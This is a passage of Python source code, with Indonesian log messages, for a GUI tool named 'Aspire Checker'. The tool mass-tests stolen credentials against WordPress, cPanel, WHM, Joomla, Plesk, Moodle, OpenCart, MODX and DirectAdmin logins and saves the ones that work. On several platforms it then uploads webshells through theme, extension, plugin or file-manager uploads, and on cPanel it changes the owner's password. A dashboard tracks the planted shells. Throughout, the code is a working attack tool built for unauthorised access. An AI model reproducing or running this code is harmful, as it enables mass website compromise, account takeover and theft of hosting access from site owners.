            files_up = {
                'themezip': (theme_name, open(themes_zip, 'rb'), 'multipart/form-data')
            }
            
            upload_url = url + '/wp-admin/update.php?action=upload-theme'
            print(f"[DEBUG] Upload URL: {upload_url}")
            
            response = session.post(
                upload_url,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
                cookies=session.cookies,
                files=files_up,
                data=data,
                verify=False,
                timeout=30
            )
            print(f"[DEBUG] Upload response status: {response.status_code}")
            
            if response.status_code == 200:
                print("[DEBUG] Theme berhasil diupload")
                with open('results/success_upload_themes.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{url}\n")
                
                # Try to access common shell paths
                url_shells = [
                    '/wp-content/themes/twentytwentyone/sky.php',
                    '/wp-content/themes/twentytwenty/sky.php',
                    '/wp-content/themes/theme/sky.php',
                    '/wp-content/themes/uploader.php'
                ]
                
                found = False
                for shell_url in url_shells:
                    full_shell_url = url + shell_url
                    print(f"[DEBUG] Mengecek shell di: {full_shell_url}")
                    try:
                        req = requests.get(full_shell_url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=5, verify=False)
                        if req.status_code == 200:
                            content = req.text
                            if any(keyword in content for keyword in ['Tesla', 'ALFA', 'shell', 'Shell']):
                                print(f"[DEBUG] Shell ditemukan di: {full_shell_url}")
                                with open('results/shells.txt', 'a', encoding='utf-8') as f:
                                    f.write(f"{full_shell_url}\n")
                                self.total_shells_uploaded += 1
                                found = True
                                break
                    except:
                        continue
                
                return found
            else:
                print(f"[DEBUG] Upload theme gagal dengan status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[ERROR] Exception di upload_themes: {e}")
            import traceback
            traceback.print_exc()
            return False

    def get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"

    def random_name_generator(self, length=8):
        """Generates a random string for filenames."""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def check_joomla_login(self, url, username, password):
        login_url = url
        try:
            session = requests.Session()
            response = session.get(login_url, verify=False, allow_redirects=False, timeout=self.timeout)
            pattern = re.compile('type=\"hidden\" name=\"([a-f0-9]{32})\" value=\"1\"')
            findtoken = re.findall(pattern, response.text)
            if not findtoken:
                return False
            data = {
                'username': username,
                'passwd': password,
                findtoken[0]: '1',
                'lang': 'en-GB',
                'option': 'com_login',
                'task': 'login'
            }
            post_response = session.post(login_url, data=data, verify=False, timeout=self.timeout)
            soup = BeautifulSoup(post_response.text, 'html.parser')
            if 'New Article' in post_response.text or 'Control Panel' in (soup.title.string if soup.title else ''):
                self.save_into_file('aspire-joomla.txt', f'{url}:{username}:{password}')
                shell_path = 'pawnd/pawnd.zip'
                self.upload_extension(session, url, shell_path)
                return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Error saat memeriksa Joomla di {url}: {e}")
        return False

    def upload_extension(self, session, url, extension_path):
        try:
            base_url = url.rstrip('/')
            upload_url = f'{base_url}/administrator/index.php?option=com_installer&view=install'
            token = self.get_upload_token(session, url)
            if not token:
                return
            with open(extension_path, 'rb') as file_handle:
                files = {'install_package': file_handle}
                data = {'type': '', 'installtype': 'upload', 'task': 'install.install', token: '1'}
                response = session.post(upload_url, files=files, data=data, verify=False, timeout=30)
                if 'Installing component was successful.' in response.text:
                    base_domain = base_url.split('/administrator/index.php')[0]
                    shell_url = f'{base_domain}/components/com_profiles/sky.php?sky' 
                    self.save_into_file('shell-joomla.txt', f'{shell_url}\n')
                    self.upload_success_handler(shell_url)
        except Exception as e:
            logging.error(f"Gagal mengunggah ekstensi Joomla ke {url}: {e}")

    def get_upload_token(self, session, url):
        try:
            upload_url = url.rstrip('/') + '/administrator/index.php?option=com_installer&view=install'
            response = session.get(upload_url, verify=False, timeout=30)
            pattern = re.compile('type=\"hidden\" name=\"(.*?)\" value=\"1\"')
            tokens = re.findall(pattern, response.text)
            if tokens:
                return tokens[0]
        except Exception as e:
            logging.error(f"Gagal mendapatkan token unggah Joomla dari {url}: {e}")
        return None

    def check_whm_login(self, url, username, password):
        login_url = f'{self.ensure_valid_scheme(url)}/login/'
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'keep-alive',
            'Origin': url,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
        }
        params = {'login_only': '1'}
        data = {'user': username, 'pass': password}
        try:
            response = requests.post(login_url, params=params, headers=headers, data=data, timeout=self.timeout, verify=False)
            response.raise_for_status()
            json_response = response.json()
            if json_response.get('status') == 1:
                self.save_into_file('aspire-whm.txt', f'{url}|{username}|{password}\n')
                return True
        except (requests.exceptions.RequestException, ValueError) as e:
            logging.error(f"Error saat memeriksa WHM di {url}: {e}")
        return False

    def upload_file_to_all_domains(self, session, token, url, domains, file_path="pawnd/kom.php"):
        shell_urls = []
        try:
            for domain_type in ["main_domain", "addon_domains", "sub_domains"]:
                entries = domains.get("data", {}).get(domain_type)
                if not entries:
                    continue
                if isinstance(entries, dict):
                    entries = [entries]
                for entry in entries:
                    docroot = entry.get("documentroot")
                    domain = entry.get("domain")
                    if not docroot or not domain:
                        continue
                    upload_url = f"{url}/cpsess{token}/execute/Fileman/upload_files"
                    random_filename = self.random_name_generator()
                    data = {'dir': docroot}
                    try:
                        with open(file_path, 'rb') as f:
                            files = {
                                'file-0': (random_filename, f, 'application/octet-stream')
                            }
                            upload_resp = session.post(upload_url, data=data, files=files, verify=False)
                        if upload_resp.status_code != 200:
                            logging.warning(f"[UPLOAD FAIL HTTP]: {upload_resp.status_code} | {upload_resp.text[:300]}")
                            continue
                        try:
                            upload_json = upload_resp.json()
                        except Exception as e:
                            logging.error(f"[UPLOAD JSON ERROR]: {e} | Response text: {upload_resp.text[:300]}")
                            continue
                        if upload_json.get("status") == 1 and upload_json["data"].get("succeeded") == 1:
                            shell_url = f"https://{domain}/{random_filename}"
                            shell_urls.append(shell_url)
                            logging.info(f"[UPLOAD]: Success => {shell_url}")
                            os.makedirs('results', exist_ok=True)
                            with open("results/cpanel-shell.log", "a") as shell_file:
                                shell_file.write(f"{shell_url}\n")
                            self.upload_success_handler(shell_url)
                        else:
                            logging.warning(f"[UPLOAD]: Failed => {domain} | Response JSON: {upload_json}")
                    except Exception as e:
                        logging.error(f"[UPLOAD ERROR]: {e}")
        except Exception as e:
            logging.error(f"[UPLOAD LOOP ERROR]: {e}")
        return shell_urls
    
    def generate_random_password(self, length=16):
        """Generates a random password for cPanel password change."""
        characters = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(characters) for i in range(length))
    
    def check_cpanel_domain(self, url, username, old_password):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
        try:
            login_data = {'user': username, 'pass': old_password}
            login_resp = session.post(f"{url}/login/?login_only=1", data=login_data, timeout=30, allow_redirects=True, verify=False)
            login_resp.raise_for_status()
            login_json = login_resp.json()
            if login_json.get("status") != 1:
                logging.warning(f"[ERROR]: Login failed for {url}")
                return False
            token = login_json.get("security_token", "")[7:]
            if not token:
                logging.error(f"[ERROR]: Token parse error for {url}")
                return False
            change_url = f"{url}/cpsess{token}/frontend/jupiter/passwd/changepass.html"
            check_resp = session.get(change_url, timeout=30, verify=False)
            if check_resp.status_code in [401, 403] or "<html" in check_resp.text.lower():
                logging.info(f"[INFO]: Password change is restricted, skipping and proceeding to upload.")
                final_password = old_password
            else:
                new_password = self.generate_random_password()
                payload = {
                    'oldpass': old_password,
                    'newpass': new_password,
                    'newpass2': new_password,
                    'enablemysql': '1',
                    'B1': 'Change your password now!'
                }
                try:
                    session.post(change_url, data=payload, timeout=30, verify=False)
                    logging.info(f"[INFO]: Password successfully changed.")
                    final_password = new_password
                except Exception as e:
                    logging.error(f"[ERROR]: Password change failed: {e}")
                    final_password = old_password
            domains_resp = session.post(
                f"{url}/cpsess{token}/execute/DomainInfo/domains_data",
                data={"return_https_redirect_status": "1"}, timeout=30, verify=False
            )
            domains_resp.raise_for_status()
            domains_json = domains_resp.json()
            if domains_json.get("status") == 1:
                main_dom = domains_json["data"]["main_domain"]["domain"]
                shell_links = self.upload_file_to_all_domains(session, token, url, domains_json)
                shell_list_str = ', '.join(shell_links)
                logging.info(f"[GOOD]: {url} | Domain: {main_dom} | USER: {username} | PASSWORD: {final_password} | Shell [ {shell_list_str} ]")
                os.makedirs('results', exist_ok=True)
                with open("results/cpanel.log", "a") as logf:
                    logf.write(f"[GOOD]: {url} | Domain: {main_dom} | USER: {username} | PASSWORD: {final_password} | Shell [ {shell_list_str} ]\n")
                return True
            else:
                logging.error(f"[ERROR]: Domain fetch failed for {url}")
                return False
        except requests.exceptions.RequestException as e:
            logging.error(f"[ERROR]: Request failed for {url}: {e}")
            return False
        except json.JSONDecodeError:
            logging.error(f"[ERROR]: JSON decode error for {url}")
            return False
        finally:
            session.close()
            time.sleep(0.1)

    @staticmethod
    def extract_ids_and_dirs(text):
        ids = re.findall(r'"domainId"[\"\/:]+(\d+)', text)
        dirs = re.findall(r'"webrootDir":"([^"]+)"', text)
        filemanager_urls = re.findall(r'"filemanagerUrl":"([^"]+)"', text)
        display_names = re.findall(r'"displayName":"([^"]+)"', text)
        dirs = [unquote(d) for d in dirs]
        if len(dirs) < len(ids):
            dirs += ['/'] * (len(ids) - len(dirs))
        if len(filemanager_urls) < len(ids):
            filemanager_urls += [''] * (len(ids) - len(filemanager_urls))
        if len(display_names) < len(ids):
            display_names += [''] * (len(ids) - len(display_names))
        return ids, dirs, filemanager_urls, display_names

    def upload_files(self, base_url, session, login, password):
        logging.info(f"[~] Starting upload_files() for {base_url}")
        try:
            view = session.get(base_url + self.WEB_DOMAINS_PATH, timeout=self.timeout, verify=False)
            html = view.text
        except RequestException as e:
            logging.error(f"[!] Error accessing {self.WEB_DOMAINS_PATH}: {e}")
            return False

        domain_ids, current_dirs, _, display_names = self.extract_ids_and_dirs(html)
        if not domain_ids:
            logging.warning(f"[-] No domains found at {base_url}")
            return False

        uploaded = []
        random_filename_val = self.random_name_generator()
        logging.info(f"[~] Will upload as {random_filename_val}")

        with open(self.OUTPUT_FILE, 'a') as out:
            for did, cdir, disp in zip(domain_ids, current_dirs, display_names):
                logging.info(f"[+] Processing domainId={did}, dir={cdir}, name={disp}")
                try:
                    fm = session.get(base_url + self.FILE_MANAGER_PATH, timeout=self.timeout, verify=False)
                    soup = BeautifulSoup(fm.text, 'html.parser')
                    token_tag = soup.find('meta', {'name': 'forgery_protection_token'})
                    if not token_tag:
                        logging.error("[-] Failed to get CSRF token, cannot upload.")
                        continue
                    token = token_tag['content']
                except Exception as e:
                    logging.error(f"[-] Failed to get CSRF token: {e}")
                    continue

                up_url = f"{base_url}/smb/file-manager/upload/domainId/{did}?currentDir={cdir}&recursively=1"
                try:
                    with open(self.FILE_PATH, 'rb') as fobj:
                        resp = session.post(
                            up_url,
                            files={'file': (random_filename_val, fobj, 'application/octet-stream')},
                            data={'forgery_protection_token': token},
                            timeout=self.timeout, verify=False
                        )
                    result = resp.json()
                except RequestException as e:
                    logging.error(f"[!] Upload request failed: {e}")
                    continue
                except ValueError:
                    logging.warning(f"[-] Response was not JSON: {resp.text[:200]}")
                    continue

                if result.get('status') == 'SUCCESS':
                    final = f"https://{disp}/{random_filename_val}"
                    logging.info(f"[+] Success → {final}")
                    out.write(final + '\n')
                    uploaded.append(final)
                    self.upload_success_handler(final)
                else:
                    logging.warning(f"[-] Upload failed: {result}")

        if uploaded:
            self.save_into_file('aspire-plesk.txt', f"{base_url}|{login}|{password}|{','.join(uploaded)}\n")
            return True
        return False

    def plesk_check_and_upload(self, url, username, password):
        url = self.ensure_valid_scheme(url)
        base_url = self.get_base_url(url)
        logging.info(f"[*] Checking Plesk: {base_url} with {username}")
        try:
            s = requests.Session()
            login_resp = s.post(
                urljoin(url, self.LOGIN_PATH),
                data={'login_name': username, 'passwd': password, 'locale_id': 'en-US'},
                timeout=self.timeout,
                verify=False
            )
        except requests.RequestException as e:
            logging.error(f"[!] Network error during Plesk check: {e}")
            return False

        if self.WEB_DOMAINS_PATH not in login_resp.url:
            logging.warning("[-] Plesk login failed")
            return False

        logging.info("[+] Plesk login successful")
        return self.upload_files(base_url, s, username, password)

    @staticmethod
    def extract_related_domains_and_ip(response_text):
        ip_regex = r'\"ipv4Address\":\"([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\"'
        domains_regex = r'\"displayName\":\"([^\"]+)\"'
        domains = re.findall(domains_regex, response_text)
        ip_address_match = re.search(ip_regex, response_text)
        ip_address = ip_address_match.group(1) if ip_address_match else None
        return domains, ip_address

    def check_da_login(self, url, username, password):
        login_url = f'{self.ensure_valid_scheme(url)}/CMD_API_SUBDOMAIN?domain=all&json=yes'
        try:
            response = requests.get(
                login_url,
                auth=HTTPBasicAuth(username, password),
                timeout=self.timeout,
                verify=False
            )
            response.raise_for_status()
            json_response = response.json()
            if isinstance(json_response, dict):
                subdomains = list(json_response.keys())
                formatted_subdomains = ', '.join(subdomains)
                self.save_into_file('aspire-directamin.txt', f'{url}|{username}|{password} | domain list: {formatted_subdomains}\n')
                return True
        except Exception as e:
            logging.error(f"Error saat memeriksa DirectAdmin di {url}: {e}")
        return False

    def check_opencart_login(self, url, username, password):
        if '/admin' not in url:
            admin_url = url.rstrip('/') + '/admin/'
        else:
            admin_url = url

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        })

        try:
            response = session.get(admin_url, verify=False, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')

            form = soup.find('form', {'id': 'form-login'})
            if not form:
                return False

            action_url = form.get('action')
            if not action_url:
                return False

            payload = {'username': username, 'password': password}
            full_action_url = urljoin(admin_url, action_url)
            login_response = session.post(full_action_url, data=payload, verify=False, timeout=self.timeout, allow_redirects=False)

            if login_response.status_code in (301, 302, 303) and 'Location' in login_response.headers:
                redirect_url = login_response.headers['Location']
                if 'route=common/dashboard' in redirect_url:
                    self.save_into_file('aspire-opencart.txt', f'{url}|{username}|{password}\n')
                    return True

            return False
        except requests.RequestException as e:
            logging.error(f"Error checking OpenCart at {url}: {e}")
            return False

    def check_modx_login(self, url, username, password):
        if '/manager' not in url:
            login_url = url.rstrip('/') + '/manager/'
        else:
            login_url = url

        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        })

        try:
            session.get(login_url, verify=False, timeout=self.timeout)
            data = {
                'username': username,
                'password': password,
                'login': 'Login',
                'rememberme': '1',
            }
            login_response = session.post(login_url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)

            if 'logout' in login_response.text.lower() or 'MODX.loadPage' in login_response.text:
                self.save_into_file('aspire-modx.txt', f'{url}|{username}|{password}\n')
                return True

            return False
        except requests.RequestException as e:
            logging.error(f"Error saat memeriksa MODX di {url}: {e}")
            return False

    def check_moodle_login(self, url, username, password):
        try:
            base_url = url.rstrip('/').replace('/login/index.php', '')
            login_url = f"{base_url}/login/index.php"
            addon_url = f"{base_url}/admin/tool/installaddon/index.php"
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0 Safari/537.36'
            })
            r = session.get(login_url, timeout=30, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            token_input = soup.find('input', {'name': 'logintoken'})
            token = token_input['value'] if token_input else ''
            payload = {
                'username': username,
                'password': password,
                'logintoken': token
            }
            resp = session.post(login_url, data=payload, timeout=30, verify=False, allow_redirects=True)
            redirected_url = resp.url.lower()
            final_html = resp.text.lower()
            if 'login/index.php' in redirected_url or 'invalidlogin' in final_html or 'log in' in final_html:
                logging.warning(f"[-] Login Moodle gagal: {url}")
                return False
            if 'logout' not in final_html:
                logging.warning(f"[-] Login Moodle gagal (tidak ada link logout): {url}")
                return False
            logging.info(f"[+] Login Moodle sukses: {url}")

            res_admin = session.get(addon_url, timeout=30, verify=False)
            admin_html = res_admin.text.lower()
            admin_soup = BeautifulSoup(res_admin.text, 'html.parser')
            if (
                res_admin.status_code == 200 and
                'access denied' not in admin_html and
                admin_soup.find('a', string=re.compile(r'(admin|site administration|plugins)', re.I))
            ):
                logging.info(f"[+] ADMIN Moodle terdeteksi: {url}")
                self.save_into_file("moodle-good.txt", f"{url}#{username}@{password}\n")
                self.upload_shell_moodle(session, base_url)
                return True
            else:
                logging.warning(f"[-] Bukan admin Moodle: {url}")
                self.save_into_file("moodle_logs.txt", f"{url}#{username}@{password} (Non-Admin)\n")
                return True
        except Exception as e:
            logging.error(f"[!] ERROR saat memeriksa Moodle di {url}: {e}")
            return False

    def upload_shell_moodle(self, session, moodle_url):
        try:
            moodle_url = moodle_url.rstrip('/')
            install_addon_url = f"{moodle_url}/admin/tool/installaddon/index.php"
            logging.info("[*] Memuat halaman instalasi Moodle...")
            resp = session.get(install_addon_url, verify=False, timeout=30)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, 'html.parser')
            sesskey_input = soup.find('input', {'name': 'sesskey'})
            if not sesskey_input:
                logging.error("[!] Gagal mendapatkan sesskey Moodle")
                return False
            sesskey = sesskey_input['value']
            logging.info(f"[+] Sesskey Moodle didapatkan: {sesskey}")
            repo_id = 5
            zip_path = "pawnd/plugin_moodle.zip"
            upload_url = f"{moodle_url}/repository/repository_ajax.php?action=upload"
            try:
                with open(zip_path, 'rb') as f:
                    files = { 'repo_upload_file': (os.path.basename(zip_path), f, 'application/zip'), }
                    data = {
                        'sesskey': sesskey, 'repo_id': str(repo_id), 'ctx_id': '1',
                        'itemid': str(int(time.time())), 'author': 'System Admin', 'license': 'allrightsreserved',
                        'env': 'filepicker', 'accepted_types[]': ['.zip'],
                    }
                    logging.info("[*] Mengunggah file plugin Moodle...")
                    upload_resp = session.post(upload_url, data=data, files=files, verify=False, timeout=30)
                    try:
                        json_resp = upload_resp.json()
                        logging.debug(f"[DEBUG] Respons unggahan Moodle: {json_resp}")
                        if 'error' in json_resp:
                            logging.error(f"[!] Unggahan Moodle gagal: {json_resp['error']}")
                            return False
                        itemid = json_resp.get('id')
                        if not itemid:
                            logging.error("[!] Tidak ada itemid dalam respons unggahan Moodle")
                            return False
                        logging.info(f"[+] File Moodle berhasil diunggah, itemid: {itemid}")
                    except ValueError:
                        logging.error(f"[!] Respons unggahan Moodle tidak valid: {upload_resp.text}")
                        return False
            except FileNotFoundError:
                logging.error(f"[!] File plugin Moodle tidak ditemukan: {zip_path}")
                return False

            install_data = {
                'sesskey': sesskey, '_qf__tool_installaddon_installfromzip_form': '1', 'zipfile': itemid,
                'plugintype': '', 'submitbutton': 'Install plugin from the ZIP file', 'maturity': '200',
                'rootdir': '', 'acknowledgement': '1',
            }
            headers = { 'Referer': install_addon_url, 'X-Requested-With': 'XMLHttpRequest', }
            logging.info("[*] Mengirimkan permintaan instalasi Moodle...")
            install_resp = session.post(install_addon_url, data=install_data, headers=headers, verify=False, timeout=30)
            soup = BeautifulSoup(install_resp.text, 'html.parser')
            confirm_form = soup.find('form')
            if confirm_form:
                logging.info("[*] Menemukan formulir konfirmasi Moodle, mengirimkan...")
                confirm_url = urljoin(moodle_url, confirm_form.get('action', install_addon_url))
                confirm_data = {}
                for input_tag in confirm_form.find_all('input'):
                    name = input_tag.get('name')
                    value = input_tag.get('value', '')
                    if name: confirm_data[name] = value
                confirm_data['submitbutton'] = 'Continue'; confirm_data['confirm'] = 'Confirm'
                session.post(confirm_url, data=confirm_data, headers=headers, verify=False, timeout=30)

            shell_url = f"{moodle_url}/local/moodle_webshellxyz/kom.php"
            check_resp = session.get(shell_url, verify=False, timeout=10)
            if check_resp.status_code == 200:
                logging.info(f"[+] Shell Moodle berhasil diinstal di: {shell_url}")
                self.save_into_file('moodle-shell.txt', f"{shell_url}\n")
                self.upload_success_handler(shell_url)
                return True

            logging.warning("[!] Instalasi Moodle mungkin berhasil sebagian atau gagal.")
            logging.info(f"Periksa secara manual di: {shell_url}")
            return False
        except Exception as e:
            logging.critical(f"[!] Error kritis saat mengunggah shell Moodle: {str(e)}", exc_info=True)
            return False

    def get_cms_type(self, url):
        url = url.lower()
        if 'wp-login.php' in url: return 'WordPress'
        if ':2083' in url: return 'cPanel'
        if ':2087' in url: return 'WHM'
        if '/admin/' in url and '/administrator/' not in url: return 'OpenCart'
        if '/administrator' in url: return 'Joomla'
        if 'login_up.php' in url or ':8443' in url: return 'Plesk'
        if '/login/index.php' in url or 'moodle' in url: return 'Moodle'
        if ':2222' in url: return 'Directadmin'
        return 'Unknown'

    def worker_function(self, url, user, password):
        if not self.is_running: return
        valid = False
        cms_type = "Unknown"
        if self.active_checker:
            cms_type = self.get_cms_type(url)
            try:
                check_map = {
                    'WordPress': self.check_wp_login,
                    'cPanel': self.check_cpanel_domain,
                    'WHM': self.check_whm_login,
                    'Joomla': self.check_joomla_login,
                    'Plesk': self.plesk_check_and_upload,
                    'OpenCart': self.check_opencart_login,
                    'Moodle': self.check_moodle_login,
                    'Directadmin': self.check_da_login,
                }
                if cms_type in check_map: valid = check_map[cms_type](url, user, password)
            except Exception as e: logging.error(f"Unhandled exception in checker for {url} ({cms_type}): {e}")

        if valid: self.signals.update_table.emit(f'{user}:{password}', urlparse(url).netloc, url, cms_type)
        with self.lock:
            self.total_checked += 1
            if valid: self.total_valid += 1
            if self.total_checked % self.BATCH_UPDATE_SIZE == 0 or self.total_checked == len(self.extracted_lines):
                self.signals.stats_update.emit(
                    self.task_id, len(self.extracted_lines), self.total_checked,
                    self.total_valid, self.total_checked - self.total_valid, self.total_shells_uploaded
                )

    def run(self):
        threading.current_thread().name = f"CheckerWorker-{self.task_id}"
        try:
            with ThreadPoolExecutor(max_workers=300, thread_name_prefix=f'CheckerThread-{self.task_id}') as executor:
                futures = {executor.submit(self.worker_function, *line) for line in self.get_lines_generator()}
                for future in as_completed(futures):
                    if not self.is_running:
                        for f in futures: f.cancel()
                        break
                    try: future.result()
                    except Exception as e: logging.error(f"Error processing future result: {e}")
        finally:
            self.signals.stats_update.emit(
                self.task_id, len(self.extracted_lines), self.total_checked,
                self.total_valid, self.total_checked - self.total_valid, self.total_shells_uploaded
            )
            final_status = "Dihentikan" if not self.is_running else "Selesai"
            self.signals.task_finished.emit(self.task_id, final_status)


class NotificationWidget(QWidget):
    def __init__(self, icon_svg, title, message, parent=None):
        super().__init__(parent)
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.Tool | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground); self.setAttribute(Qt.WA_DeleteOnClose)
        container = QWidget(self); container.setObjectName("NotificationContainer")
        container.setStyleSheet("#NotificationContainer { background-color: #282828; border-radius: 8px; border: 1px solid #3d3d3d; padding: 10px; }")
        main_layout = QVBoxLayout(container); main_layout.setContentsMargins(5, 5, 5, 5)
        header_layout = QHBoxLayout(); header_layout.setSpacing(10)
        icon_label = QLabel(); pixmap = QPixmap(); pixmap.loadFromData(QByteArray(icon_svg.encode()))
        icon_label.setPixmap(pixmap.scaled(20, 20, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        title_label = QLabel(title); title_label.setStyleSheet("font-size: 14px; font-weight: 600; color: #ffffff;")
        header_layout.addWidget(icon_label); header_layout.addWidget(title_label); header_layout.addStretch()
        message_label = QLabel(message); message_label.setStyleSheet("font-size: 13px; color: #b0bec5; padding-left: 2px;")
        message_label.setWordWrap(True); main_layout.addLayout(header_layout); main_layout.addWidget(message_label)
        outer_layout = QVBoxLayout(self); outer_layout.addWidget(container); self.setLayout(outer_layout)
        self.setFixedSize(350, self.sizeHint().height())
        self.timer = QTimer(self); self.timer.setSingleShot(True)
        self.timer.timeout.connect(self.close); self.timer.start(5000)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.combo_files = []; self.signals = CheckerSignals()
        self.signals.update_table.connect(self.update_results_table)
        self.signals.stats_update.connect(self.update_stats)
        self.signals.shell_uploaded.connect(self.add_new_shell_to_gui)
        self.signals.task_finished.connect(self.on_task_finished)
        self.active_shells = []; self.active_workers = {}; self.task_counter = 0
        self.task_stats_cache = {}; self.notifications = []
        self.global_checked = 0; self.global_valid = 0; self.global_invalid = 0; self.global_shells = 0
        self.stats_lock = threading.Lock()
        self.shell_checker = PersistentShellChecker(); self.shell_checker.shell_status_checked.connect(self.update_shell_status); self.shell_checker.start()
        self.setWindowTitle("Aspire Checker")
        self.resize(1100, 680)
        self.setWindowFlags(Qt.FramelessWindowHint); self.setStyleSheet(STYLESHEET)
        self.central_widget = QWidget(); self.main_layout = QHBoxLayout(self.central_widget)
        self.main_layout.setContentsMargins(0, 0, 0, 0); self.main_layout.setSpacing(0); self.setCentralWidget(self.central_widget)
        self.splitter = QSplitter(Qt.Horizontal); self.main_layout.addWidget(self.splitter)
        self.sidebar = self.create_sidebar(); self.splitter.addWidget(self.sidebar)
        self.content_area = QWidget(); self.content_layout = QVBoxLayout(self.content_area)
        self.content_layout.setContentsMargins(15, 10, 15, 10); self.content_layout.setSpacing(15); self.splitter.addWidget(self.content_area)
        self.header_bar = self.create_header_bar(); self.content_layout.addWidget(self.header_bar)
        self.content_stack = QStackedWidget(); self.content_stack.addWidget(self.create_dashboard_page())
        self.content_stack.addWidget(self.create_webshell_page()); self.content_stack.addWidget(self.create_worker_page())
        self.content_layout.addWidget(self.content_stack, 1)
        self.splitter.setSizes([70, 1030]); self.splitter.setCollapsible(0, False)
        self.dragging = False; self.offset = QPoint()

    def create_sidebar(self):
        sidebar = QWidget(); sidebar.setObjectName("Sidebar")
        sidebar.setFixedWidth(70)
        layout = QVBoxLayout(sidebar); layout.setContentsMargins(8, 8, 8, 8); layout.setSpacing(4)
        layout.setAlignment(Qt.AlignTop)

        self.dashboard_button = self.create_nav_button("Dashboard", ICONS["dashboard"], 0)
        self.webshell_button = self.create_nav_button("Webshell Manager", ICONS["webshell"], 1)
        self.worker_button = self.create_nav_button("Worker", ICONS["worker"], 2)

        self.dashboard_button.setChecked(True)

        layout.addWidget(self.dashboard_button)
        layout.addWidget(self.webshell_button)
        layout.addWidget(self.worker_button)

        layout.addStretch(1)
        return sidebar

    def create_nav_button(self, text, icon_svg, index):
        button = QToolButton()
        button.setIcon(self.create_icon(icon_svg))
        button.setToolTip(text)
        button.setIconSize(QSize(24, 24))
        button.setToolButtonStyle(Qt.ToolButtonIconOnly)
        button.setFixedSize(52, 52)
        button.setProperty("class", "NavButton")
        button.setCheckable(True)
        button.clicked.connect(lambda: self.switch_page(index, text, button))
        return button

    def switch_page(self, index, title, button):
        self.content_stack.setCurrentIndex(index); self.page_title.setText(title)
        for btn in [self.dashboard_button, self.webshell_button, self.worker_button]: btn.setChecked(btn is button)

    def create_header_bar(self):
        header_bar = QWidget(); header_bar.setFixedHeight(60); layout = QHBoxLayout(header_bar); layout.setContentsMargins(0, 0, 5, 0)
        self.page_title = QLabel("Dashboard"); self.page_title.setObjectName("PageTitleLabel")
        layout.addWidget(self.page_title); layout.addStretch()
        min_btn = QToolButton(); min_btn.setObjectName("WindowButton"); min_btn.setIcon(self.create_icon(ICONS["minimize"])); min_btn.clicked.connect(self.showMinimized)
        self.max_button = QToolButton(); self.max_button.setObjectName("WindowButton"); self.max_button.setIcon(self.create_icon(ICONS["maximize"])); self.max_button.clicked.connect(self.toggle_maximize_restore)
        close_btn = QToolButton(); close_btn.setObjectName("WindowButton"); close_btn.setProperty("id", "CloseButton"); close_btn.setIcon(self.create_icon(ICONS["close"])); close_btn.clicked.connect(self.close)
        layout.addWidget(min_btn); layout.addWidget(self.max_button); layout.addWidget(close_btn)
        header_bar.installEventFilter(self)
        return header_bar

    def create_stat_card(self, title, icon_svg):
        card = QWidget(); card.setProperty("class", "StatCard")
        layout = QVBoxLayout(card); layout.setContentsMargins(20, 15, 20, 15)
        title_layout = QHBoxLayout(); icon = QLabel(); icon.setPixmap(self.create_icon(icon_svg).pixmap(20,20))
        label = QLabel(title); label.setProperty("class", "StatTitleLabel")
        title_layout.addWidget(icon); title_layout.addWidget(label); title_layout.addStretch()
        value_label = QLabel("0"); value_label.setProperty("class", "StatValueLabel")
        layout.addLayout(title_layout); layout.addWidget(value_label)
        shadow = QGraphicsDropShadowEffect(); shadow.setBlurRadius(20); shadow.setXOffset(0); shadow.setYOffset(5); shadow.setColor(QColor(0,0,0,80)); card.setGraphicsEffect(shadow)
        return card, value_label

    def create_dashboard_page(self):
        page = QWidget(); layout = QVBoxLayout(page); layout.setContentsMargins(0,0,0,0); layout.setSpacing(15)
        stats_layout = QHBoxLayout(); stats_layout.setSpacing(15)
        card_checked, self.stats_checked_label = self.create_stat_card("Total Diperiksa", ICONS["checked"])
        card_valid, self.stats_valid_label = self.create_stat_card("Total Valid", ICONS["valid"])
        card_invalid, self.stats_invalid_label = self.create_stat_card("Total Gagal", ICONS["invalid"])
        card_shell, self.stats_shell_label = self.create_stat_card("Total Shell", ICONS["shell"])
        stats_layout.addWidget(card_checked); stats_layout.addWidget(card_valid); stats_layout.addWidget(card_invalid); stats_layout.addWidget(card_shell)
        layout.addLayout(stats_layout)
        self.results_table = QTableWidget(); self.results_table.setColumnCount(4)
